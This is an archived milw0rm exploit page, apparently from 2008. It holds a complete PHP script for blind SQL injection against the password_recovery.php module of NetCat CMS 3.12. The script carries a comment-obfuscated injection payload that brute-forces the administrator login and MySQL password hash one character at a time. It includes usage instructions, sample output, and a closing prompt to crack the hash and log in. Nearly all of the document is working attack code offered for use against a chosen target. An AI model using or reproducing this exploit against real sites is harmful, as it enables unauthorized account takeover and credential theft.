<html><head><title>CMS NetCat 3.12 (password_recovery.php) Blind SQL Injection Exploit</title></head><pre>&lt;?

/*
	NetCat Blind SQL Injection exploit by s4avrd0w [s4avrd0w@p0c.ru]
	Versions affected 3.12

	More info: http://www.netcat.ru/

	* tested on version 3.12

	usage: 

	# ./NetCat_blind_SQL_exploit.php -s=NetCat_server -u=User_ID

	The options are required:
	 -u The user identifier (number in table)
	 -s Target for exploiting

	example:

	# ./NetCat_blind_SQL_exploit.php -s=http://localhost/netcat/ -u=2

	[+] Phase 1 brute login.
	[+] Brute 1 symbol...
	...........a
	[+] Brute 2 symbol...
	..............d
	[+] Brute 3 symbol...
	.......................m
	[+] Brute 4 symbol...
	...................i
	[+] Brute 5 symbol...
	........................n
	[+] Brute 6 symbol...
	.....................................
	[+] Phase 1 successfully finished: admin
	[+] Phase 2 brute password-hash.
	[+] Brute 1 symbol...
	*
	[+] Brute 2 symbol...
	.0
	[+] Brute 3 symbol...
	.0
	[+] Brute N symbol...
	
	&lt;...&gt;
	
	[+] Brute 42 symbol...
	.....................................
	[+] Phase 2 successfully finished: *00a51f3f48415c7d4e8908980d443c29c69b60c9
	
	
	[+] Exploiting is finished successfully
	[+] Login - admin
	[+] MySQL hash - *00a51f3f48415c7d4e8908980d443c29c69b60c9
	[+] Decrypt MySQL hash and login into NetCat CMS.

*/


function http_connect($query)
{

	global $server;

	$headers = array(
	    'User-Agent' =&gt; 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14',
	    'Referer' =&gt; $server
	);

	$res_http = new HttpRequest($server.&quot;modules/auth/password_recovery.php?=1&quot;.$query, HttpRequest::METH_GET);
	$res_http-&gt;addHeaders($headers);

	try {
		$response = $res_http-&gt;send()-&gt;getBody();

		if (eregi(&quot;page_header&quot;, $response))
		{
			return 1;
		}
		else
		{
			return 0;
		}

	} catch (HttpException $exception) {

		print &quot;[-] Not connected&quot;;
		exit(0);

	}

}

function brute($User_id,$table)
{
	$ret_str = &quot;&quot;;

	for ($i=1;$i&lt;43;$i++)
	{
		print &quot;[+] Brute $i symbol...\n&quot;;

		for ($j=42;$j&lt;123;$j++)
		{
			$q = &quot;'/**/OR/**/1=if((ASCII(lower(SUBSTRING((SELECT/**/$table/**/FROM/**/USER/**/limit/**/$User_id,1),$i,1))))=$j,1,0)/*&quot;;

			if (http_connect($q))
			{
				$ret_str=$ret_str.chr($j);
				print chr($j).&quot;\n&quot;;
				break;
			}
			print &quot;.&quot;;

			if ($j == 57) $j = 96;
			if ($j == 42) $j = 47;

		}

		if ($j == 123) break;
	}

	return $ret_str;
}


function help_argc($script_name)
{
print &quot;
usage:

# ./&quot;.$script_name.&quot; -s=NetCat_server -u=User_ID

The options are required:
 -u The user identifier (number in table)
 -s Target for exploiting

example:

# ./&quot;.$script_name.&quot; -s=http://localhost/netcat/ -u=1
[+] Phase 1 brute login.
[+] Brute 1 symbol...
..1
[+] Brute 2 symbol...
.....................................
[+] Phase 1 successfully finished: 1
[+] Phase 2 brute password-hash.
[+] Brute 1 symbol...
.....................................
[+] Phase 2 successfully finished:


[+] Exploiting is finished successfully
[+] Login - 1
[+] MySQL hash -
[+] You can login into NetCat CMS with the empty password
&quot;;
}

function successfully($login,$hash)
{
print &quot;

[+] Exploiting is finished successfully
[+] Login - $login
[+] MySQL hash - $hash
&quot;;

if ($hash) print &quot;[+] Decrypt MySQL hash and login into NetCat CMS.\n&quot;;
else print &quot;[+] You can login into NetCat CMS with the empty password\n&quot;;

}

if (($argc != 3) || in_array($argv[1], array('--help', '-help', '-h', '-?')))
{
	help_argc($argv[0]);
	exit(0);
}
else
{
	$ARG = array(); 
	foreach ($argv as $arg) { 
		if (strpos($arg, '-') === 0) { 
			$key = substr($arg,1,1);
			if (!isset($ARG[$key])) $ARG[$key] = substr($arg,3,strlen($arg)); 
		} 
	}

	if ($ARG[s] &amp;&amp; $ARG[u])
	{
		$server = $ARG[s];
		$User_id = intval($ARG[u]);
		$User_id--;

		print &quot;[+] Phase 1 brute login.\n&quot;;
		$login = brute($User_id,&quot;Login&quot;);
		print &quot;\n[+] Phase 1 successfully finished: $login\n&quot;;

		print &quot;[+] Phase 2 brute password-hash.\n&quot;;
		$hash = brute($User_id,&quot;Password&quot;);
		print &quot;\n[+] Phase 2 successfully finished: $hash\n&quot;;

		successfully($login,$hash);
	}
	else
	{
		help_argc($argv[0]);
		exit(0);
	}

}

?&gt; 

# milw0rm.com [2008-12-23]</pre></html>